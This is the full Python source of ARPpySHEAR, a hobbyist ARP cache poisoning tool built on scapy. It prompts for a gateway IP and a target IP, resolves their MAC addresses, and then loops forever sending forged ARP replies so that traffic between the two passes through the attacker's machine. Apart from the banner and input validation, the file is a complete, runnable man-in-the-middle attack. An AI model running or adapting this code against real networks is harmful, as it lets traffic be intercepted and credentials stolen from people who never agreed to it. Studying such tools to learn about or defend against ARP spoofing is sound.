# arppyshear.py
# ARPpySHEAR is an ARP cache poisoning tool, 
# created by student237 to be used in MITM attacks.
# 
# Copyright (c) 2019-2020 Jesse Blier (student237)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#
# student237 <student237 at protonmail dot com>


from scapy.all import *
from time import sleep
import sys

#Function to post application title banner to the user. 
def postTitleBanner(red, yellow, white, reset):
	try:
		print(red + "    _    ____  ____              ____  _   _ _____    _    ____   ")
		sleep(.25)
		print("   / \  |  _ \|  _ \ _ __  _   _/ ___|| | | | ____|  / \  |  _ \  ")
		sleep(.25)
		print("  //_ \ | |_) | |_) | '_ \| | | \___ \| |_| |  _|   //_ \ | |_) |")
		sleep(.25)
		print(" / ___ \|  _ <|  __/| |_) | |_| |___) |  _  | |___ / ___ \|  _ < ")
		sleep(.25)
		print("/_/   \_\_| \_\_|   | .__/ \__, |____/|_| |_|_____/_/   \_\_| \_\ ")
		sleep(.25)
		print("                    |_|    |___/" + white + "                            v.1.0 ")
		sleep(.25)
		print(yellow + "                                                   By: student237" + reset)
		sleep(.25)
		print("		    ARP cache poisoning")
		print("Shearing the bond between MAC and IPv4 addresses in dynamic ARP entries")
		print("     Be ethical. Use responsibly and stay out of prison...\n\n")
	except KeyboardInterrupt:
		#Exit the application appropriately.
		print("\n\nARPpySHEAR terminated by user. Exiting.")
		sys.exit(0)

#Function to post the MAC resolution notification to the user. 
def postResolveMAC(red, yellow, reset):
	try:
		print(red + "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + reset)
		print(yellow + "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + reset)
		print("*      ARPpySHEAR is resolving MAC addresses.")
		print(yellow + "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + reset)
		print(red + "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n" + reset)
		sleep(2)
	except KeyboardInterrupt:
		#Exit the application appropriately.
		print("\n\nARPpySHEAR terminated by user. Exiting.")
		sys.exit(0)

#Function to post the start of attack notification to the user.
def postStartAttack(gatewayIP, gatewayMAC, targetIP, targetMAC, red, yellow, reset):
	try:
		print(red + "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + reset)
		print(yellow + "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + reset)
		print("**     MAC addresses acquired.")
		sleep(2)
		print("***    Poisoning ARP cache in the following network resources:")
		print("****   Gateway IP: " + str(gatewayIP) + ", Gateway MAC: " + str(gatewayMAC))
		sleep(2)
		print("*****  Target IP: " + str(targetIP) + ", Target MAC: " + str(targetMAC))
		sleep(2)
		print("****** ARPpySHEAR is starting attack....")
		print(yellow + "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + reset)
		print(red + "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n" + reset)
		sleep(5)
	except KeyboardInterrupt:
		#Exit the application appropriately.
		print("\n\nARPpySHEAR terminated by user. Exiting.")
		sys.exit(0)

#Function for user input sanitization/validation.
def inputValidation(checkMe):
	try:
		#Split up the input string for inspection of each IPv4 octet. 
		rawInputCheckList = checkMe.split(".")

		#Set the counter at the first list element and the inspection state as True.
		count = 0
		state = True

		#Check to see if there are greater than four list elements (octets) or an extra "." delimiter. 
		#If there are, return a False inspection state.
		if len(rawInputCheckList) > 4:
			return False
		else:
			#If there ARE only the four expected list elements, continue testing. 
			#Iterate through the elements and check the octets for a valid IPv4 format/values.
			while count < 4:
				#Convert element string to an integer for inspection.
				tempInt = int(rawInputCheckList[count])

				#Check octet for a valid value. If all is well, increment the count variable and continue
				#to inspect the next octet in the address. 
				if tempInt >= 0 and tempInt <= 255:
					count += 1
				#If invalid, set the inspection state to False and terminate the loop.
				else:
					state = False
					break
			#Return the inspection state to the input inspection variable.
			return state
			
	#For failures related to causes not handled above...
	except(AttributeError, IndexError, LookupError, SyntaxError, TypeError, ValueError):
		return False

#Function to collect user input (network gateway IP address).
def collectGatewayIP(error, reset):
	try:
		gateIn = raw_input("Enter the network gateway IP address (IPv4 format xxx.xxx.xxx.xxx): ")
		testValue = inputValidation(gateIn)
		if testValue is True:
			return gateIn
		else:
			print(error + "ERROR!" + reset + " Invalid IPv4 address format or value. Try again.\n")
			return collectGatewayIP(error, reset)
	except KeyboardInterrupt:
		#Exit the application appropriately.
		print("\n\nARPpySHEAR terminated by user. Exiting.")
		sys.exit(0)

#Function to collect user input (network target IP address).
def collectTargetIP(gateway, error, reset):
	try:
		targetIn = raw_input("Enter the network target's IP address (IPv4 format xxx.xxx.xxx.xxx): ")
		testValue = inputValidation(targetIn)
		if testValue is True:
			#Check to see if the target IP address equals the gateway IP address. If so, display
			#an error message and re-prompt the user for a new target IP address. Otherwise, return
			#the target IP address. 
			if targetIn == gateway:
				print(error + "ERROR!" + reset + " In a MITM attack, the target IP address cannot be the same as the gateway IP address. Try again.\n")
				return collectTargetIP(gateway, error, reset)
			else:	
				return targetIn
		else:
			print(error + "ERROR!" + reset + " Invalid IPv4 address format or value. Try again.\n")
			return collectTargetIP(gateway, error, reset)
	except KeyboardInterrupt:
		#Exit the application appropriately.
		print("\n\nARPpySHEAR terminated by user. Exiting.")
		sys.exit(0)

#Function to request and return the gateway MAC address.
def getGatewayMAC(gatewayIP):
	try:
		reqSnd = sr1(ARP(op = 1, pdst = gatewayIP), timeout = 0.5)
		if reqSnd == "":
			print("\nHost " + str(gatewayIP) + " not found. Exiting ARPpySHEAR...")
			sys.exit(1)		
		else:
			reqStore = reqSnd.summary()
			procMAC = reqStore.split(" ")
			return procMAC[3]
	except (AttributeError, Exception, Warning):
		print("\nHost " + str(gatewayIP) + " not found. Exiting ARPpySHEAR...")
		sys.exit(1)		

#Function to request and return the target machine MAC address.
def getTargetMAC(targetIP):
	try:	
		reqSnd = sr1(ARP(op = 1, pdst = targetIP), timeout = 0.5)
		if reqSnd == "":
			print("\nHost " + str(targetIP) + " not found. Exiting ARPpySHEAR...")
			sys.exit(1)			
		else:
			reqStore = reqSnd.summary()
			procMAC = reqStore.split(" ")
			return procMAC[3]
	except (AttributeError, Exception, Warning):
		print("\nHost " + str(targetIP) + " not found. Exiting ARPpySHEAR...")
		sys.exit(1)

#Function to send ARP reply packets to the gateway and target machines.
def sendARPReply(gatewayIP, gatewayMAC, targetIP, targetMAC):
	#Send ARP reply to gatewayIP with targetIP and attacker MAC.
	send(ARP(op = 2, psrc = targetIP, hwdst = gatewayMAC, pdst = gatewayIP))
	print(" > ARPpySHEAR sent an ARP reply to " + str(gatewayIP) + ", mapping " + str(targetIP) + " to Attacker MAC")

	#Send ARP reply to targetIP with gatewayIP and attacker MAC.
	send(ARP(op = 2, psrc = gatewayIP, hwdst = targetMAC, pdst = targetIP))
	print(" >> ARPpySHEAR sent an ARP reply to " + str(targetIP) + ", mapping " + str(gatewayIP) + " to Attacker MAC")

	#Pause for one second. 
	sleep(1)

#The main function calls all other functions and runs the show.
def main():
	#Declare color and end variables
	cRed = "\033[91m"
	cYellow = "\033[93m"
	cWhite = "\033[97m"
	cError = "\x1b[93;41m"
	cReset = "\033[0m"

	#Call the banner post function.
	postTitleBanner(cRed, cYellow, cWhite, cReset)

	#Call the user-supplied IPv4 Addresses via input functions and store the results in variables.
	gatewayIP = collectGatewayIP(cError, cReset)
	targetIP = collectTargetIP(gatewayIP, cError, cReset)

	#Call the three MAC related functions. Post to user, and store the results in variables.
	postResolveMAC(cRed, cYellow, cReset)
	gatewayMAC = getGatewayMAC(gatewayIP)
	targetMAC = getTargetMAC(targetIP)

	#Call startAttack function and post to user. 
	postStartAttack(gatewayIP, gatewayMAC, targetIP, targetMAC, cRed, cYellow, cReset)

	#Create an infinite loop that calls the sendARPReply function repeatedly until interrupted by the user.
	while True:
		try:
			#Call the ARP cache poisoning function.
			sendARPReply(gatewayIP, gatewayMAC, targetIP, targetMAC)	
		except KeyboardInterrupt:
			#Exit the application appropriately.
			print("\n\nARPpySHEAR terminated by user. Exiting.")
			sys.exit(0)

if __name__ == '__main__':
    main()	
